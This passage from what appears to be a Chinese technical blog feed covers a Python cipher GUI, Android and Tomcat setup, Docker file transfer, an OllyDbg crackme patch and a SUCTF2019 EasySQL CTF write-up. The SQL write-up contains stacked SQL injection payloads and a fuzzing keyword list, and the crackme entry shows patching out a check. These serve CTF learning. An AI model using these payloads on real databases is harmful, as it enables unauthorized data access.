text2.insert(1.0, n)def cycle_decrypt(str):    str = str[0:-1]  # 切片去除字符串最后默认有的换行    key = tk.simpledialog.askstring(&quot;提示&quot;, &quot;请输入密钥(默认为1324):&quot;, initialvalue=&#39;1324&#39;)    key=key[::-1]#反转字符串    k = len(key)  # 列数    l = int((len(str) / k))  # 行数    cipher = []  # 置换前的矩阵    for i in range(0, k):        cipher.append(&#39;&#39;.join([str[j] for j in range(0, len(str)) if j % k == i]))    m = [&#39;&#39; for i in range(0, k)]  # 保存置换后的矩阵    for i in range(0, k - 1):        m[int(key[i + 1]) - 1] = cipher[int(key[i]) - 1]    m[int(key[0]) - 1] = cipher[int(key[k - 1]) - 1]    n = &#39;&#39;  # 保存置换后并按顺序排列    for i in range(0, l):        for j in range(0, k):            n += m[j][i]    text1.delete(1.0, END)    text1.insert(1.0, n)    return nif __name__ ==&quot;__main__&quot;:    label = tk.Label(window, text=&#39;请选择加密方式:&#39;, bg=&#39;green&#39;, font=(&#39;宋体&#39;, 12), width=20, height=2)    labe2 = tk.Label(window, text=&#39;原文:&#39;, font=(&#39;宋体&#39;, 12), width=20, height=2)    labe3 = tk.Label(window, text=&#39;密文:&#39;, font=(&#39;宋体&#39;, 12), width=20, height=2)    text1 = tk.Text(window, show=None, font=(&#39;Arial&#39;, 10))    text2 = tk.Text(window, show=None, font=(&#39;Arial&#39;, 10))    button1 = tk.Button(window, text=&#39;加密&#39;, font=(&#39;宋体&#39;, 12,), width=5, height=1, command=encrypt)    button2 = tk.Button(window, text=&#39;解密&#39;, font=(&#39;宋体&#39;, 12,), width=5, height=1, command=decrypt)    button3 = tk.Button(window,text=&quot;导入原文&quot;,command=file_import)    button4 = tk.Button(window,text=&quot;导出密文&quot;,command=cipher_save)    button5 = tk.Button(window, text=&quot;导出原文&quot;, command=file_save)    button6 = tk.Button(window, text=&quot;导入密文&quot;, command=cipher_import)    var = tk.StringVar()    r1 = tk.Radiobutton(window, text=&#39;凯撒密码&#39;, variable=var,value=&#39;A&#39;)    r2 = tk.Radiobutton(window, text=&#39;仿射密码&#39;, variable=var, value=&#39;B&#39;)    r3 = tk.Radiobutton(window, text=&#39;列置换&#39;, variable=var, value=&#39;C&#39;)    r4 = tk.Radiobutton(window, text=&#39;周期置换&#39;, variable=var, value=&#39;D&#39;)    r5 = tk.Radiobutton(window, text=&#39;凯撒+列置换&#39;, variable=var, value=&#39;E&#39;)    r6 = tk.Radiobutton(window, text=&#39;仿射+列置换&#39;, variable=var, value=&#39;F&#39;)    r7 = tk.Radiobutton(window, text=&#39;凯撒+周期置换&#39;, variable=var, value=&#39;G&#39;)    r8 = tk.Radiobutton(window, text=&#39;仿射+周期置换&#39;, variable=var, value=&#39;H&#39;)    text1.place(relx=0.2,rely=0.3,relwidth=0.6,relheight=0.2)    text2.place(relx=0.2,rely=0.7,relwidth=0.6,relheight=0.2)    label.place(relx=0,rely=0,relwidth=0.3)    labe2.place(relx=0,rely=0.35,relwidth=0.3)    labe3.place(relx=0,rely=0.75,relwidth=0.3)    r1.place(relx=0.3,rely=0,relwidth=0.3,relheight=0.1)    r2.place(relx=0.3,rely=0.1,relwidth=0.3,relheight=0.1)    r3.place(relx=0.5,rely=0,relwidth=0.3,relheight=0.1)    r4.place(relx=0.5,rely=0.1,relwidth=0.3,relheight=0.1)    r5.place(relx=0.7,rely=0,relwidth=0.3,relheight=0.1)    r6.place(relx=0.7, rely=0.1, relwidth=0.3, relheight=0.1)    r7.place(relx=0.35, rely=0.2, relwidth=0.2, relheight=0.1)    r8.place(relx=0.55, rely=0.2, relwidth=0.2, relheight=0.1)    button1.place(relx=0.3,rely=0.9)    button2.place(relx=0.6,rely=0.9)    button3.place(relx=0.85,rely=0.3,relwidth=0.1,relheight=0.1)    button6.place(relx=0.85,rely=0.7,relwidth=0.1,relheight=0.1)    button5.place(relx=0.85, rely=0.4, relwidth=0.1, relheight=0.1)    button4.place(relx=0.85, rely=0.8, relwidth=0.1, relheight=0.1)    window.mainloop() #主窗口循环显示</code></pre>]]></content>
    
    
    <categories>
      
      <category>crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从零开始android开发(二)</title>
    <link href="/newblog/2020/03/20/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8Bandroid%E5%BC%80%E5%8F%91-%E4%BA%8C/"/>
    <url>/newblog/2020/03/20/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8Bandroid%E5%BC%80%E5%8F%91-%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<p>今天要完成一个启动页，然后跳转到主程序。</p><h2 id="Override"><a href="#Override" class="headerlink" title="@Override"></a>@Override</h2><p><code>@Override</code>表示重写。编译器可以验证<code>@Override</code>下面的方法名是否是你父类中所有的，如果没有则报错。</p><h2 id="启动页"><a href="#启动页" class="headerlink" title="启动页"></a>启动页</h2><h3 id="闪屏"><a href="#闪屏" class="headerlink" title="闪屏"></a>闪屏</h3><pre><code class="xml">  &lt;activity            android:name=&quot;.StartPageActivity&quot;            android:theme=&quot;@style/SplashActivityTheme&quot;&gt;            &lt;intent-filter&gt;                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;            &lt;/intent-filter&gt;       &lt;/activity&gt;</code></pre><h3 id="表示主activity"><a href="#表示主activity" class="headerlink" title="表示主activity"></a>表示主activity</h3><pre><code>&lt;intent-filter&gt;                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;&lt;/intent-filter&gt;</code></pre><p>小记录，如果你的程序闪退，有可能是你调用了那个xml，但是没在application里声明activity。。。</p><h3 id="编辑样式"><a href="#编辑样式" class="headerlink" title="编辑样式"></a>编辑样式</h3><p>在style.xml中编辑主题样式SplashActivityTheme:</p><pre><code>&lt;!-- Base application theme. --&gt;    &lt;style name=&quot;SplashActivityTheme&quot; parent=&quot;android:Theme.Holo.Light.NoActionBar&quot;&gt;        &lt;!-- Customize your theme here. --&gt;        &lt;item name=&quot;android:windowBackground&quot;&gt;@drawable/splash&lt;/item&gt;    &lt;/style&gt; </code></pre><p>背景图片是drawable下的splash图片</p><h3 id="activity跳转"><a href="#activity跳转" class="headerlink" title="activity跳转"></a>activity跳转</h3><p>一个app启动时，首先是启动页，然后跳转到主程序。<br>跳转语句如下</p><pre><code>Intent intent = new Intent(FirstActivity.this,SecondActivity.class);startActivity(intent);</code></pre><h4 id="传送参数"><a href="#传送参数" class="headerlink" title="传送参数"></a>传送参数</h4><h5 id="putExtra"><a href="#putExtra" class="headerlink" title="putExtra"></a>putExtra</h5><p>发送</p><pre><code>intent.putExtra(&quot;name&quot;,&quot;chenxiyuan&quot;);intent.putExtra(&quot;age&quot;,20);</code></pre><p>接收</p><pre><code>String name = intent.getStringExtra(&quot;name&quot;);int age = intent.getIntExtra(&quot;age&quot;);</code></pre><h5 id="Bundle"><a href="#Bundle" class="headerlink" title="Bundle"></a>Bundle</h5><p>发送</p><pre><code>Bundle bundle = new Bundle();bundle.putString(&quot;name&quot;,&quot;chenxiyuan&quot;);bundle.putInt(&quot;age&quot;,20);intent.putExtras(bundle);</code></pre><p>接收</p><pre><code>Bundle bundle = intent.getExtras();String name = bundle.getString(&quot;name&quot;);int age = bundle.getInt(&quot;age&quot;);</code></pre><h2 id="webview不跳转到浏览器"><a href="#webview不跳转到浏览器" class="headerlink" title="webview不跳转到浏览器"></a>webview不跳转到浏览器</h2><p>在loadurl方法前加入如下,即可实现不跳转到默认浏览器，而是在页面内访问。</p><pre><code>myWebView.setWebViewClient(new WebViewClient());</code></pre><h2 id="状态栏透明"><a href="#状态栏透明" class="headerlink" title="状态栏透明"></a>状态栏透明</h2><p>启动页如果状态栏不透明，效果会很差。可以定义如下方法，然后在onCreate后调用此方法就行了。</p><pre><code>public static void setTranslucent(Activity activity) {        if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.KITKAT) {            // 设置状态栏透明            activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);        }    }</code></pre>]]></content>
    
    
    <categories>
      
      <category>安卓开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ubuntu+java+tomcat</title>
    <link href="/newblog/2020/03/19/ubuntu-java-tomcat-mysql/"/>
    <url>/newblog/2020/03/19/ubuntu-java-tomcat-mysql/</url>
    
    <content type="html"><![CDATA[<h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><p>安装默认版本</p><pre><code>sudo apt install default-jdk</code></pre><p>Java 8</p><pre><code>sudo apt install openjdk-8-jdk</code></pre><p>which java</p><pre><code>root@356ca11f70aa:/usr/local# which java/usr/bin/javaroot@356ca11f70aa:/usr/local# ls /usr/bin/java/usr/bin/javaroot@356ca11f70aa:/usr/local# ls -l /usr/bin/javalrwxrwxrwx 1 root root 22 Mar 19 05:13 /usr/bin/java -&gt; /etc/alternatives/javaroot@356ca11f70aa:/usr/local# ls -l /etc/alternatives/javalrwxrwxrwx 1 root root 43 Mar 19 05:13 /etc/alternatives/java -&gt; /usr/lib/jvm/java-11-openjdk-amd64/bin/javaroot@356ca11f70aa:/usr/local# ls -l /usr/lib/jvm/java-11-openjdk-amd64/bin/java-rwxr-xr-x 1 root root 10304 Jan 15 15:14 /usr/lib/jvm/java-11-openjdk-amd64/bin/javaroot@356ca11f70aa:/usr/local# cd /usr/lib/jvm/java-11-openjdk-amd64root@356ca11f70aa:/usr/lib/jvm/java-11-openjdk-amd64# lsbin  conf  docs  include  jmods  legal  lib  man  release</code></pre><p>配置环境变量</p><pre><code>vim /etc/profile</code></pre><p>在最后面添加</p><pre><code>export JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64export PATH=$PATH:$JAVA_HOME/binexport CLASSPATH=.:$JAVA_HOME/lib/tools.jar:$JAVA_HOME/lib/dt.jar</code></pre><p>然后更新</p><pre><code>source /etc/profileroot@356ca11f70aa:/usr/lib/jvm/java-11-openjdk-amd64# echo $JAVA_HOME     /usr/lib/jvm/java-11-openjdk-amd64</code></pre><p>或者输出版本号</p><pre><code>root@356ca11f70aa:/usr/lib/jvm/java-11-openjdk-amd64# java -versionopenjdk version &quot;11.0.6&quot; 2020-01-14OpenJDK Runtime Environment (build 11.0.6+10-post-Ubuntu-1ubuntu118.04.1)OpenJDK 64-Bit Server VM (build 11.0.6+10-post-Ubuntu-1ubuntu118.04.1, mixed mode, sharing)</code></pre><p>编个程序试试</p><pre><code>vim test.javapublic class test {        public static void main(String args[]) {                System.out.println(&quot;Hello world!&quot;);        }}</code></pre><p>编译执行</p><pre><code>root@356ca11f70aa:~# javac test.javaroot@356ca11f70aa:~# java testHello world!</code></pre><h2 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h2><p>Tomcat服务器是一个免费的开放源代码的Web应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP程序的首选。<br><a href="https://tomcat.apache.org/" target="_blank" rel="noopener">tomcat官网</a><br>我下载好传到docker里</p><pre><code>cp apache-tomcat-8.5.53.tar.gz /usr/local/</code></pre><p>解压</p><pre><code>tar -zxvf apache-tomcat-8.5.53.tar.gz</code></pre><p>赋权限</p><pre><code>chmod 755 -R apache-tomcat-8.5.53</code></pre><p>修改启动脚本，进入tomcat的bin目录下</p><pre><code>vi startup.sh</code></pre><p>在最后一句前加上如下</p><pre><code>#set java environmentexport JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64export JRE_HOME=${JAVA_HOME}/jreexport CLASSPATH=.:%{JAVA_HOME}/lib:%{JRE_HOME}/libexport PATH=${JAVA_HOME}/bin:$PATH#tomcatexport TOMCAT_HOME=/usr/local/apache-tomcat-8.5.53</code></pre><p>运行</p><pre><code>./startup.sh</code></pre>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>linux</tag>
      
      <tag>tomcat</tag>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>给服务器和docker传文件</title>
    <link href="/newblog/2020/03/19/%E7%BB%99%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8Cdocker%E4%BC%A0%E6%96%87%E4%BB%B6/"/>
    <url>/newblog/2020/03/19/%E7%BB%99%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8Cdocker%E4%BC%A0%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="本机到服务器"><a href="#本机到服务器" class="headerlink" title="本机到服务器"></a>本机到服务器</h2><p>用xshell连服务器，可以用<code>scp</code>传。<br>今天发现了一个好用的命令<code>rz</code>,可以直接上传文件到当前文件夹。</p><pre><code>rz [选项]选项说明：-+, --append:将文件内容追加到已存在的同名文件-a,--ascii:以文本方式传输-b, --binary:以二进制方式传输，推荐使用--delay-startup N:等待N秒-e, --escape:对所有控制字符转义，建议使用-E, --rename:已存在同名文件则重命名新上传的文件，以点和数字作为后缀-p, --protect:对ZMODEM协议有效，如果目标文件已存在则跳过 -q, --quiet:安静执行，不输出提示信息-v, --verbose:输出传输过程中的提示信息-y, --overwrite:存在同名文件则替换-X, --xmodem:使用XMODEM协议--ymodem:使用YMODEM协议-Z, --zmodem:使用ZMODEM协议--version：显示版本信息--h, --help：显示帮助信息</code></pre><p>下载到本地就用sz命令。</p><h2 id="服务器到docker"><a href="#服务器到docker" class="headerlink" title="服务器到docker"></a>服务器到docker</h2><p>服务器到docker</p><pre><code>docker cp 本机保存文件的全路径 container_id:docker容器内的文件全路径</code></pre><p>docker到服务器</p><pre><code>docker cp container_id:docker容器内的文件全路径 本机保存文件的全路径</code></pre>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从零开始android开发(一)</title>
    <link href="/newblog/2020/03/17/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8Bandroid%E5%BC%80%E5%8F%91-%E4%B8%80/"/>
    <url>/newblog/2020/03/17/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8Bandroid%E5%BC%80%E5%8F%91-%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<p>因为某些原因，打算学习安卓开发，记录一下每一步。</p><h1 id="Bottom-Navigation-Activity"><a href="#Bottom-Navigation-Activity" class="headerlink" title="Bottom Navigation Activity"></a>Bottom Navigation Activity</h1><p>首先开发工具是as3，新建一个bottom navigation activity，因为底部导航栏是比较常用的嘛，这里就直接建一个项目。</p><h2 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h2><h3 id="androidmainfest-xml"><a href="#androidmainfest-xml" class="headerlink" title="androidmainfest.xml"></a>androidmainfest.xml</h3><p>这个是android的主配置文件，采用XML描述语言。<br>AndroidManifest.xml配置文件的根元素，必须包含一个<application>元素并且指定xlmns:android和package属性。xlmns:android指定了Android的命名空间，默认情况下是“<a href="http://schemas.android.com/apk/res/android”；而package是标准的应用包名，也是一个应用进程的默认名称。" target="_blank" rel="noopener">http://schemas.android.com/apk/res/android”；而package是标准的应用包名，也是一个应用进程的默认名称。</a><br>android:versionCode是给设备程序识别版本用的，必须是一个整数值代表app更新过多少次；而android:versionName则是给用户查看版本用的，需要具备一定的可读性，比如“1.0.0”这样的。<br>下面是一份官方的AndroidManifest.xml，格式是这样，具体解析就不赘述了。</application></p><pre><code class="xml">&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;          package=&quot;com.sample.teapot&quot;          android:versionCode=&quot;1&quot;          android:versionName=&quot;1.0.0.1&quot; &gt;  &lt;uses-feature android:glEsVersion=&quot;0x00020000&quot;&gt;&lt;/uses-feature&gt;  &lt;application      android:allowBackup=&quot;false&quot;      android:fullBackupContent=&quot;false&quot;      android:supportsRtl=&quot;true&quot;      android:icon=&quot;@mipmap/ic_launcher&quot;      android:label=&quot;@string/app_name&quot;      android:theme=&quot;@style/AppTheme&quot;      android:name=&quot;com.sample.teapot.TeapotApplication&quot;      &gt;    &lt;!-- Our activity is the built-in NativeActivity framework class.         This will take care of integrating with our NDK code. --&gt;    &lt;activity android:name=&quot;com.sample.teapot.TeapotNativeActivity&quot;              android:label=&quot;@string/app_name&quot;              android:configChanges=&quot;orientation|keyboardHidden&quot;&gt;      &lt;!-- Tell NativeActivity the name of our .so --&gt;      &lt;meta-data android:name=&quot;android.app.lib_name&quot;                 android:value=&quot;TeapotNativeActivity&quot; /&gt;      &lt;intent-filter&gt;        &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;        &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;      &lt;/intent-filter&gt;    &lt;/activity&gt;  &lt;/application&gt;&lt;/manifest&gt;</code></pre><h3 id="java"><a href="#java" class="headerlink" title="java"></a>java</h3><p>java文件夹里有dashboard,home,notifications三个文件夹和一个MainActivity.三个文件夹分别是对应的底部三个导航栏。每个文件夹下有两个文件，一个是用来承载控件的fragment，另一个是与之对应的viewModel。fragment用来显示ui界面，而viewmodel则是给ui界面提供数据，view里的每一个控件在viewmodel里都有一个对应的数据对象，如果要更新view上的ui界面，只需要更新viewmodel里与之对应的对象即可。</p><h3 id="res"><a href="#res" class="headerlink" title="res"></a>res</h3><h4 id="menu"><a href="#menu" class="headerlink" title="menu"></a>menu</h4><p>menu文件夹下的bottom_nav_menu.xml操控底部导航栏图标。</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;menu xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt;    &lt;item        android:id=&quot;@+id/navigation_home&quot;        android:icon=&quot;@drawable/ic_home_black_24dp&quot;        android:title=&quot;@string/title_home&quot; /&gt;    &lt;item        android:id=&quot;@+id/navigation_dashboard&quot;        android:icon=&quot;@drawable/ic_dashboard_black_24dp&quot;        android:title=&quot;@string/title_dashboard&quot; /&gt;    &lt;item        android:id=&quot;@+id/navigation_notifications&quot;        android:icon=&quot;@drawable/ic_notifications_black_24dp&quot;        android:title=&quot;@string/title_notifications&quot; /&gt;    &lt;item        android:id=&quot;@+id/navigation_me&quot;        android:icon=&quot;@drawable/ic_notifications_black_24dp&quot;        android:title=&quot;@string/title_me&quot; /&gt;&lt;/menu&gt;</code></pre><p>这里我可以自定义一个底部item，这里的@string/title_home是在res-&gt;values-&gt;strings.xml里定义。然后在java-&gt;ui文件夹下新建一个me的Package，在Package里右键new-&gt;Fragment-&gt;Fragment(with ViewMoudle)。<br>然后修改MainActivity里的代码。</p><pre><code class="java">AppBarConfiguration appBarConfiguration = new AppBarConfiguration.Builder(                R.id.navigation_home, R.id.navigation_dashboard, R.id.navigation_notifications,R.id.navigation_me)                .build();</code></pre><h4 id="layout"><a href="#layout" class="headerlink" title="layout"></a>layout</h4><p>layout下是每一个的布局文件。</p><h4 id="navigation"><a href="#navigation" class="headerlink" title="navigation"></a>navigation</h4><p>相应修改此处的mobile_navigation.xml.</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;navigation xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;    xmlns:tools=&quot;http://schemas.android.com/tools&quot;    android:id=&quot;@+id/mobile_navigation&quot;    app:startDestination=&quot;@+id/navigation_home&quot;&gt; //默认启动页    &lt;fragment        android:id=&quot;@+id/navigation_home&quot;        android:name=&quot;com.chenxiyuan.youbang.ui.home.HomeFragment&quot;        android:label=&quot;@string/title_home&quot;        tools:layout=&quot;@layout/fragment_home&quot; /&gt;    &lt;fragment        android:id=&quot;@+id/navigation_dashboard&quot;        android:name=&quot;com.chenxiyuan.youbang.ui.dashboard.DashboardFragment&quot;        android:label=&quot;@string/title_dashboard&quot;        tools:layout=&quot;@layout/fragment_dashboard&quot; /&gt;    &lt;fragment        android:id=&quot;@+id/navigation_notifications&quot;        android:name=&quot;com.chenxiyuan.youbang.ui.notifications.NotificationsFragment&quot;        android:label=&quot;@string/title_notifications&quot;        tools:layout=&quot;@layout/fragment_notifications&quot; /&gt;    &lt;fragment        android:id=&quot;@+id/navigation_me&quot;        android:name=&quot;com.chenxiyuan.youbang.ui.me.MeFragment&quot;        android:label=&quot;@string/title_me&quot;        tools:layout=&quot;@layout/me_fragment&quot; /&gt;&lt;/navigation&gt;</code></pre><h2 id="webview组件"><a href="#webview组件" class="headerlink" title="webview组件"></a>webview组件</h2><p>先简单用一下webview组件。<br>在mainfest里添加网络权限</p><pre><code>&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;</code></pre><p>在layout里对应的布局文件里，Palette-&gt;Widgets-&gt;Webview,添加组件。</p><pre><code class="xml">&lt;WebView        android:id=&quot;@+id/webview&quot;        android:layout_width=&quot;match_parent&quot;        android:layout_height=&quot;match_parent&quot; /&gt;</code></pre><p>这里我直接在HomeFragment里调用webview.</p><pre><code class="java">public class HomeFragment extends Fragment {    private HomeViewModel homeViewModel;    public View onCreateView(@NonNull LayoutInflater inflater,                             ViewGroup container, Bundle savedInstanceState) {        homeViewModel =                ViewModelProviders.of(this).get(HomeViewModel.class);        View root = inflater.inflate(R.layout.fragment_home, container, false);        WebView myWebView = (WebView) root.findViewById(R.id.webview);        myWebView.loadUrl(&quot;http://www.baidu.com&quot;);        return root;    }}</code></pre><p>刚开始报错，在网上搜了一下，解决方法是在manifest中application节点添加:</p><pre><code>android:usesCleartextTraffic=&quot;true&quot;</code></pre><p>然后运行虚拟机，成功访问网页。</p>]]></content>
    
    
    <categories>
      
      <category>安卓开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ollydbg破解crackme001</title>
    <link href="/newblog/2020/03/16/Ollydbg%E7%A0%B4%E8%A7%A3crackme001/"/>
    <url>/newblog/2020/03/16/Ollydbg%E7%A0%B4%E8%A7%A3crackme001/</url>
    
    <content type="html"><![CDATA[<p>逆向我也只是个初学者，之前博客有记录IDA的一些使用，这次来爆破一个简单的crackme。<br>首先Ollydbg打开,看看基本逻辑。<br><img src="http://120.26.91.51:4001/uploads/big/a13e20f5af09bedfd90513890af96a8b.png" srcset="/newblog/img/loading.gif" alt="ollydbg_001"><br>可以看到输入出错后消息框里有Try again!!字符串，就从这里入手了。<br>右键中文搜索引擎-&gt;智能搜索，搜索Try<br><img src="http://120.26.91.51:4001/uploads/big/c202ac3f4f627645aa109bcea61d5b74.png" srcset="/newblog/img/loading.gif" alt="ollydbg_002"><br>分别点开这两块，来看看汇编的代码。<br><img src="http://120.26.91.51:4001/uploads/big/2e57ac013c74e65f70f4f0237229e183.png" srcset="/newblog/img/loading.gif" alt="ollydbg_003"><br>这里看到上面有一句jnz，查一下发现<code>JNZ : jump if not zero 结果不为零则转移</code>，那么这里填充NOP不让它跳转到Try again，就成功执行下去，爆破成功，下面一个同理。<br><img src="http://120.26.91.51:4001/uploads/big/bf8996de3353a03dee37886f9c3e1e20.png" srcset="/newblog/img/loading.gif" alt="ollydbg_004"><br>爆破成功。接下来保存右键-&gt;复制到可执行文件-&gt;所有修改-&gt;全部复制，然后跳转到.exe窗口，在这个窗口里右键-&gt;保存文件即可。</p>]]></content>
    
    
    <categories>
      
      <category>re</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Ollydbg</tag>
      
      <tag>逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SUCTF2019 EasySQL记录</title>
    <link href="/newblog/2020/03/16/SUCTF2019-EasySQL%E8%AE%B0%E5%BD%95/"/>
    <url>/newblog/2020/03/16/SUCTF2019-EasySQL%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>先打开测试一下，有三种，分别是array，nonono，无回显。可以堆叠注入</p><pre><code>1;show databases;1;show tables;</code></pre><h2 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h2><p>fuzz,这里贴上一些关键字</p><pre><code>length +handlerlikeselect sleepdatabasedeletehavingoras-~BENCHMARKlimitleftselectinsertright#--+INFORMATION--;!%+xor&lt;&gt;(&gt;&lt;).^=ANDBYCASTCOLUMNCOUNTCREATEENDcase&#39;1&#39;=&#39;1whenadmin&#39;&quot;length +lengthREVERSEasciiselect databaseleftrightunion&quot;&amp;&amp;&amp;||oorr/////**/*/**/ananddGROUPHAVINGIFINTOJOINLEAVELEFTLEVELsleepLIKENAMESNEXTNULLOFON|infromation_schemauserORORDERORDSCHEMASELECTSETTABLETHENUNIONUPDATEUSERUSINGVALUEVALUESWHENWHEREADDANDpreparesetupdatedeletedropinsetCASTCOLUMNCONCATGROUP_CONCATgroup_concatCREATEDATABASEDATABASESalterDELETEDROPfloorrand()information_schema.tablesTABLE_SCHEMA%dfconcat_ws()concatLIMITORDONextractvalueorder CAST()byORDEROUTFILERENAMEREPLACESCHEMASELECTSETupdatexmlSHOWSQLTABLETHENTRUEinstrbenchmarkformatbinsubstringordUPDATEVALUESVARCHARVERSIONWHENWHERE/*`,users%0a%0bmidforBEFOREREGEXPRLIKEinsys schemmaSEPARATORXORCURSORFLOORsys.schema_table_statistics_with_bufferINFILEcount%0cfrom%0d%a0=@else</code></pre><p>这里插一句，如果bp代理监听器勾选不上的话，可能是端口占用。先查找端口占用的进程<code>netstat -ano | findstr 8080</code>，再把这个进程关掉就好了。</p><h2 id="sql-mode"><a href="#sql-mode" class="headerlink" title="sql_mode"></a>sql_mode</h2><p>sql_mode定义了MySQL应支持的SQL语法，以及应该在数据上执行何种确认检查，其中的<code>PIPES_AS_CONCAT</code>将<code>||</code>视为字符串的连接操作符而非 “或” 运算符。<br><img src="http://120.26.91.51:4001/uploads/big/1020ec590df5cd332773b760656b94e2.png" srcset="/newblog/img/loading.gif" alt="sql_mode"><br>这个模式下拼接字母会出错，只能拼接数字。</p><h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>这是一个堆叠注入</p><pre><code>payload:1;set sql_mode=pipes_as_concat;select 1</code></pre><p>源码里的语句是<code>select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag</code>,现在就能够理解了。</p><h2 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h2><p><code>payload</code>:<code>*,1</code><br>拼接一下:<code>select *,1||flag from Flag</code>等同于<code>select *,1 from Flag</code></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>sql</tag>
      
      <tag>注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker+Lychee搭建自己的图床</title>
    <link href="/newblog/2020/03/16/docker-Lychee%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/"/>
    <url>/newblog/2020/03/16/docker-Lychee%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/</url>
    
    <content type="html"><![CDATA[<p>之前的图床过期，图片直接没了，所以现在在自己服务器上搭一个小型图床好了。用的是开源项目Lychee。</p><h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><p>docker安装就不记录了，之前博客写过。</p><h2 id="Lychee"><a href="#Lychee" class="headerlink" title="Lychee"></a>Lychee</h2><p>拉取镜像</p><pre><code>docker image pull kdelfour/lychee-docker</code></pre><p>运行镜像</p><pre><code>docker run -it -d -p 4001:80 kdelfour/lychee-docker</code></pre><p>然后访问<code>服务器ip:4001</code>,进行简单的设置，就可以上传图片了。</p>]]></content>
    
    
    <categories>
      
      <category>其他</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
      <tag>图床</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次ctf校赛simple_xss出题</title>
    <link href="/newblog/2020/03/15/%E8%AE%B0%E4%B8%80%E6%AC%A1ctf%E6%A0%A1%E8%B5%9Bsimple-xss%E5%87%BA%E9%A2%98/"/>
    <url>/newblog/2020/03/15/%E8%AE%B0%E4%B8%80%E6%AC%A1ctf%E6%A0%A1%E8%B5%9Bsimple-xss%E5%87%BA%E9%A2%98/</url>
    
